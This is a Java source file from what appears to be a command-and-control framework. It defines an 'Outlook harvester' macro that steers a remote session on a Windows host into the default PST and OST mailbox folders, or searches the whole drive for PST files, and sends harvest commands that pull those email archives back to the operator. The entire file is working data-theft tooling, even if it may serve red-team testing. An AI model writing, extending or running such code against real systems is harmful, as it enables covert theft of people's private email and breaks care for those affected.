package c2.session.macro;

import java.nio.file.Path;
import java.nio.file.Paths;

import c2.Commands;
import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.WindowsCmdLineHelper;

public class OutlookHarvesterMacro extends AbstractCommandMacro {

	public static String OUTLOOK_HARVEST_COMMAND = "harvest_outlook";
	public static String OUTLOOK_HARVEST_BASIC = "basic";
	public static String OUTLOOK_HARVEST_DEEP_SEARCH = "deep";

	public static String OUTLOOK_PST_DEFAULT_SEARCH_DIR = "C:\\";
	public static String OUTLOOK_PST_FIND_DIR_CMD = "where /r $SEARCH_DIR$ *.pst";

	public static String OUTLOOK_OST_DIR = "%APPDATA%\\Local\\Microsoft\\Outlook";
	public static String OUTLOOK_OST_WITH_APPDATA_ROAMING_DIR = "%APPDATA%\\..\\Local\\Microsoft\\Outlook";
	public static String OUTLOOK_PST_DIR = "%USERPROFILE%\\Documents\\Outlook Files";
	public static String OUTLOOK_PST_ONEDRIVE_DIR = "%USERPROFILE%\\OneDrive\\Documents\\Outlook Files";

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.startsWith(OUTLOOK_HARVEST_COMMAND);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String[] elements = cmd.split(" ");
		if (elements.length >= 2) {
			if (elements[1].equals(OUTLOOK_HARVEST_BASIC)) {
				if (elements.length != 2) {
					outcome.addMacroMessage(
							OUTLOOK_HARVEST_BASIC + " option takes no arguments, ignoring additional input");
				}
				String appdata = "";
				String userProfile = "";
				try {
					appdata = WindowsCmdLineHelper.resolveAppData(io, sessionId);
					outcome.addMacroMessage("Resolved APPDATA: " + appdata);
					userProfile = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%USERPROFILE%");
					outcome.addMacroMessage("Resolved USERPROFILE: " + userProfile);
				} catch (Exception e) {
					outcome.addError("Cannot resolve APPDATA and USERPROFILE");
					return outcome;
				}
				sendCommand(Commands.PWD, sessionId, outcome);
				String response = awaitResponse(sessionId, outcome);
				if (!response.equals("")) {
					outcome.addMacroMessage("Saving original working directory, proceeding with Outlook harvest");
					String originalDirectory = response.replace(System.lineSeparator(), "");
					String expectedPSTDir = OUTLOOK_PST_DIR.replace("%USERPROFILE%", userProfile);
					sendCommand(Commands.CD + " " + expectedPSTDir, sessionId, outcome);
					response = awaitResponse(sessionId, outcome);
					response = response.replace(System.lineSeparator(), "");
					boolean foundPSTDir = false;
					if (!response.equals(expectedPSTDir)) {
						outcome.addMacroMessage("Attempting OneDrive dir");
						expectedPSTDir = OUTLOOK_PST_ONEDRIVE_DIR.replace("%USERPROFILE%", userProfile);
						sendCommand(Commands.CD + " " + expectedPSTDir, sessionId, outcome);
						response = awaitResponse(sessionId, outcome);
						response = response.replace(System.lineSeparator(), "");
						if (!response.equals(expectedPSTDir)) {
							outcome.addError("Unable to switch to OST default directory for harvest");
						} else {
							foundPSTDir = true;
						}
					} else {
						foundPSTDir = true;
					}

					if (foundPSTDir) {
						sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
						response = awaitResponse(sessionId, outcome);
					}

					String expectedOSTDir;
					if (appdata.contains("Roaming")) {
						expectedOSTDir = OUTLOOK_OST_WITH_APPDATA_ROAMING_DIR.replace("%APPDATA%", appdata);
					} else {
						expectedOSTDir = OUTLOOK_OST_DIR.replace("%APPDATA%", appdata);
					}
					sendCommand(Commands.CD + " " + expectedOSTDir, sessionId, outcome);
					response = awaitResponse(sessionId, outcome);
					if (response.contains("Harvest complete: ")) {
						response = awaitResponse(sessionId, outcome);
					}
					response = response.replace(System.lineSeparator(), "");
					if (response.contains("Invalid directory traversal")) {
						outcome.addError("Unable to switch to OST default directory for harvest");
					} else {
						sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
						response = awaitResponse(sessionId, outcome);
					}

					sendCommand(Commands.CD + " " + originalDirectory, sessionId, outcome);
					if (response.contains("Harvest complete: ")) {
						response = awaitResponse(sessionId, outcome);
					}
					response = awaitResponse(sessionId, outcome);
					response = response.replace(System.lineSeparator(), "");
					if (!response.equals(originalDirectory)) {
						outcome.addError("Unable to restore original working directory");
					} else {
						outcome.addMacroMessage(
								"Original working directory resumed, harvest underway in the background if directories found");
					}
				} else {
					outcome.addError("Could not query for current working directory, aborting macro");
				}
			} else if (elements[1].equals(OUTLOOK_HARVEST_DEEP_SEARCH)) {
				sendCommand(Commands.PWD, sessionId, outcome);
				String response = awaitResponse(sessionId, outcome);
				if (!response.equals("")) {
					outcome.addMacroMessage("Saving original working directory, proceeding with Outlook harvest");
					String originalDirectory = response.replace(System.lineSeparator(), "");
					String findCmd = OUTLOOK_PST_FIND_DIR_CMD;
					if (elements.length == 3) {
						findCmd = findCmd.replace("$SEARCH_DIR$", elements[2]);
					} else {
						findCmd = findCmd.replace("$SEARCH_DIR$", OUTLOOK_PST_DEFAULT_SEARCH_DIR);
					}
					sendCommand(findCmd, sessionId, outcome);
					response = awaitResponse(sessionId, outcome, 30000);
					if (!response.contains("Attempting search with 10 minute timeout")) {
						outcome.addMacroMessage("Could not search for PST files");
					} else {
						if (!response.contains("Search complete")) {
							response = awaitResponse(sessionId, outcome, 120000);
						}
						if (!response.equals("") && !response.contains("Search complete with no findings")
								&& !response.contains("Cannot execute command ")) {
							for (String line : response.split(System.lineSeparator())) {
								if (!line.equals("Attempting search with 10 minute timeout")
										&& !line.equals("Search complete") && !line.equals("")) {// Discard final line
																									// feed flush at end
									//Why not use Paths? Doesn't work cross-platform
									String pathStr = line.substring(0, line.lastIndexOf("\\"));
									String command = Commands.CD + " " + pathStr;
									sendCommand(command, sessionId, outcome);
									response = awaitResponse(sessionId, outcome);
									response = response.replace(System.lineSeparator(), "");

									if (!response.equals(pathStr)) {
										outcome.addError("Unable to switch to PST found directory for harvest");
									} else {
										sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
										response = awaitResponse(sessionId, outcome);
									}
								}
							}
						} else {
							outcome.addMacroMessage("No PST files found.");
						}
					}

					sendCommand(Commands.CD + " " + originalDirectory, sessionId, outcome);
					response = awaitResponse(sessionId, outcome);
					response = response.replace(System.lineSeparator(), "");
					if (!response.equals(originalDirectory)) {
						outcome.addError("Unable to switch to original directory for harvest");
					} else {
						outcome.addMacroMessage(
								"Original working directory resumed, harvest underway in the background if directories found");
					}
				}

			} else {
				outcome.addError("Improper argument of command: " + OUTLOOK_HARVEST_COMMAND
						+ " 'basic' for harvesting default directories or 'deep' for searching for non-traditional PST file locations");
			}
		} else {
			outcome.addError(
					"Improper format of command: " + OUTLOOK_HARVEST_COMMAND + " - at least one argument required");
		}
		return outcome;
	}

}
